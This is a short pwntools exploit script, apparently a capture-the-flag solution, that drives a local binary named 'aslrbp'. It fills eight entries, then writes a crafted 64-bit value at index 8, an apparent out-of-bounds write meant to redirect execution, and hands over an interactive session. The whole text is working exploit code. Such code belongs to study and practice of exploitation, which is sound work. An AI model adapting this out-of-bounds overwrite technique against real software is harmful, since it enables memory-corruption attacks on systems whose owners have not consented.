from pwn import *

context.log_level = "DEBUG"

p = process(["./aslrbp", "./2"])


for i in range(8):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"value (uint64):", b"1")


p.sendlineafter(b">", b"2")
p.sendlineafter(b"index (0-8):", b"8")
p.sendlineafter(b"new value (uint64):", b"4294969388")
p.sendlineafter(b">", b"4")
p.interactive()




